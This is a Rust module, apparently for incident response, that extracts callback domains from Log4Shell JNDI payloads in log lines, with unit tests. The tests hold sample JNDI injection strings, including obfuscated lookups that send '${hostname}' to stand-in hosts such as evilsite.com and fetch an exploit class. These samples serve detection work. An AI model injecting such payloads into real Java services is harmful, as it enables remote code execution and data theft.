use std::collections::HashSet;
use std::error::Error;
use std::fs::File;
use std::io::{LineWriter, Write};
use std::path::PathBuf;
use url::{Host, ParseError, Url};

pub struct Extractor {
    is_extractable: bool,
    domains: HashSet<String>,
    failed_parsing: HashSet<String>,
}

impl Extractor {
    pub fn new(is_extractable: bool) -> Self {
        Self {
            domains: HashSet::new(),
            failed_parsing: HashSet::new(),
            is_extractable,
        }
    }

    pub fn extract_domains(&mut self, line: &str) {
        if !self.is_extractable {
            return;
        }

        let mut payloads = line;

        while let Some((start, end)) = parse_url(payloads) {
            let url = &payloads[start..end];

            match extract_domain(url) {
                Ok(domain) => {
                    self.domains.insert(domain);
                }
                Err(url) => {
                    if !url.is_empty() {
                        self.failed_parsing.insert(url);
                    }
                }
            };

            payloads = &payloads[end..];
        }
    }

    pub fn extract_to_files(&self, output_path: Option<PathBuf>) -> Result<(), Box<dyn Error>> {
        if output_path.is_none() {
            return Ok(());
        }

        let output_path = output_path.unwrap();

        if !self.domains.is_empty() {
            let file = File::create(output_path.clone())?;
            let mut file = LineWriter::new(file);

            for domain in self.domains.iter() {
                writeln!(file, "{}", domain)?;
            }

            file.flush()?;
        }

        if !self.failed_parsing.is_empty() {
            let mut error_path = output_path;
            error_path.pop();
            error_path = error_path.join("failed.log");

            let file = File::create(error_path)?;
            let mut file = LineWriter::new(file);

            for url in self.failed_parsing.iter() {
                writeln!(file, "{}", url)?;
            }

            file.flush()?;
        }

        Ok(())
    }
}

fn parse_url(line: &str) -> Option<(usize, usize)> {
    let mut search_index = line.find("//")? + 2;
    let mut offset: usize = search_index;
    let mut find_http = line.find("http://").unwrap_or(usize::MAX);
    let mut find_https = line.find("https://").unwrap_or(usize::MAX);

    while find_http < search_index || find_https < search_index {
        search_index = line[offset..].find("//")? + 2;
        find_http = line[offset..].find("http://").unwrap_or(usize::MAX);
        find_https = line[offset..].find("https://").unwrap_or(usize::MAX);
        offset += search_index;
    }

    let domain = &line[offset..];
    let first_slash = domain.find('/').unwrap_or(usize::MAX);
    let mut brackets = 1;

    // Taking care of nested jndi payloads in a query string by stopping at the "=" sign after a slash
    // It should only happen after we find the first slash since we could be removing Base64 encoded URLs otherwise
    //
    // We stop when our bracket reaches 0 since the payload has form ${jndi:ldap://<url>} and we start the search from "//",
    // hence starting the bracket count as 1 to take into account the opening bracket.
    for (pos, letter) in domain.chars().enumerate() {
        match (letter, brackets, pos > first_slash) {
            ('}', 1, _) => return Some((offset, offset + pos)),
            ('=', _, true) => return Some((offset, offset + pos)),
            ('{', _, _) => brackets += 1,
            ('}', _, _) => brackets -= 1,
            _ => continue,
        }
    }

    None
}

fn extract_domain(url: &str) -> Result<String, String> {
    let parsed_url = match Url::parse(url) {
        Err(ParseError::RelativeUrlWithoutBase) => {
            let url_with_fake_base = format!("https://{}", url);
            Url::parse(&url_with_fake_base)
        }
        result => result,
    };

    if parsed_url.is_err() || parsed_url.clone().unwrap().host().is_none() {
        match best_effort_domain_extract(url) {
            Some(best_effort) => return Ok(best_effort),
            _ => {
                return Err(url.to_string());
            }
        };
    }

    let parsed_url = parsed_url.unwrap();
    let domain = match parsed_url.host().unwrap() {
        Host::Ipv4(ip) => ip.to_string(),
        Host::Ipv6(ip) => ip.to_string(),
        domain => {
            let mut domain = domain.to_string();

            if parsed_url.port().is_some() {
                domain = format!("{}:{}", domain, parsed_url.port().unwrap());
            }

            match best_effort_domain_extract(&domain) {
                Some(best_effort) => return Ok(best_effort),
                _ => return Err(url.to_string()),
            };
        }
    };

    Ok(domain)
}

fn best_effort_domain_extract(url: &str) -> Option<String> {
    let (domain, _) = url.split_once("/").unwrap_or((url, ""));
    let last_dot = domain.rfind('.')?;
    let second_dot = &domain[..(last_dot - 1)].rfind('.');

    let domain = if second_dot.is_some() {
        let second_dot = second_dot.unwrap();
        &domain[(second_dot + 1)..]
    } else {
        &domain
    };

    if domain.contains("${") || domain.contains('}') {
        return None;
    }

    Some(domain.to_owned())
}

#[cfg(test)]
mod tests {
    use super::Extractor;

    #[test]
    fn extracts_single_domain_in_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_domains("https://mywebsite.com/?x=${jndi:ldap://${hostname}.c6340b92vtc00002.interactsh.com/path/a}");
        assert!(extractor.domains.contains("interactsh.com"));
    }

    #[test]
    fn extracts_multiple_domains_in_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_domains("${jndi:ldap://evilsite.com/z}${jndi:ldap://mywebsite.com/z}");

        assert!(extractor.domains.contains("evilsite.com"));
        assert!(extractor.domains.contains("mywebsite.com"));
    }

    #[test]
    fn extracts_ips() {
        let mut extractor = Extractor::new(true);
        extractor.extract_domains("${jndi:ldap://45.66.8.12/z}");

        assert!(extractor.domains.contains("45.66.8.12"));
    }

    #[test]
    fn extracts_base64_encoded_subdomains() {
        let mut extractor = Extractor::new(true);
        extractor.extract_domains("${jndi:ldap://cG90YXRvLmNvbTo0NDM=.c6pj00ppfhiq0g1pq80gcg3w5moyd9wo4.interactsh.com:1234/exploit.class}");

        assert!(extractor.domains.contains("interactsh.com:1234"));
    }

    #[test]
    fn extracts_multiple_domains_in_json_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_domains("{\"result\":{\"_raw\":\"{\"level\":\"info\",\"msg\":\"completed\",\"request_method\":\"get\",\"request_user_agent\":\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}.tricky.com/a}\",\"request_referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostname}.complex.dev/z}\",\"referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo.wat.ca/a}\"}}");

        assert!(extractor.domains.contains("tricky.com"));
        assert!(extractor.domains.contains("complex.dev"));
        assert!(extractor.domains.contains("wat.ca"));
    }
}
